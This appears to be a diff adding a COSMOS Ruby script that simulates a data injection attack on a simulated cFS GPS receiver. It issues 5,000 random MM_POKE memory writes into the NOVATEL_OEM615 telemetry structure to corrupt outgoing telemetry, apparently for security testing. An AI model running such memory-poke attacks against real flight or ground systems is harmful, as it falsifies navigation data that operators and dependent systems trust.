@@ -1,0 +1,90 @@
+# Data Injection Simulation Script
+
+# Author: Yasamin Fayyaz
+
+# Description:
+
+# This script performs a realistic data injection attack on simulated GPS telemetry.
+
+# It issues exactly 5,000 MM_POKE commands targeting different 4-byte offsets
+
+# within the symbolic structure associated with the NOVATEL_OEM615 GPS telemetry data.
+
+# Each value injected is randomly generated to simulate plausible but manipulated telemetry.
+
+# This attack avoids the brute-force approach used in DoS attacks and instead simulates
+
+# subtle data manipulation, consistent with realistic cyberattack behavior.
+
+
+
+require 'cosmos/script'
+
+
+
+puts "Starting GPS Data Injection Simulation (5000 structured pokes)..."
+
+
+
+# Symbolic base address for GPS telemetry structure.
+
+# This symbol refers to the struct: NOVATEL_OEM615_AppData.DevicePkt.Novatel_oem615
+
+# Source: novatel_oem615_msg.h → NOVATEL_OEM615_Device_tlm_t contains `Novatel_oem615`
+
+# which is an instance of NOVATEL_OEM615_Device_Data_tlm_t (our actual telemetry fields).
+
+# The telemetry packet is published directly using this structure in the app's main loop,
+
+# so injecting values into it will directly impact the outgoing telemetry.
+
+GPS_TLM_STRUCT = "NOVATEL_OEM615.DevicePkt.Novatel_oem615"
+
+
+
+# Parameters:
+
+DATASIZE = 4         # 4-byte pokes (e.g., float or int)
+
+MEMTYPE = 1          # Assumes memory type 1 corresponds to RAM
+
+MAX_OFFSET = 128     # Conservative range to stay within known GPS struct boundaries
+
+
+
+cmd("CFS", "TO_ENABLE_ALL")  # Ensure telemetry output is enabled
+
+
+
+5000.times do
+
+  offset = rand(0..(MAX_OFFSET / DATASIZE - 1)) * DATASIZE  # aligned to 4-byte boundary
+
+  data = rand(0..0xFFFFFFFF)  # random 4-byte unsigned int
+
+
+
+  cmd("CFS", "MM_POKE", {
+
+    "DATASIZE" => DATASIZE,
+
+    "MEMTYPE" => MEMTYPE,
+
+    "DATA" => data,
+
+    "DESTSYMADDRESS_OFFSET" => offset,
+
+    "DESTSYMADDRESS_SYMNAME" => GPS_TLM_STRUCT
+
+  })
+
+
+
+  wait(0.1)  # Inject at regular intervals to simulate realistic manipulation
+
+end
+
+
+
+prompt("GPS Data Injection Simulation complete: 5000 data points injected into telemetry structure.")
+
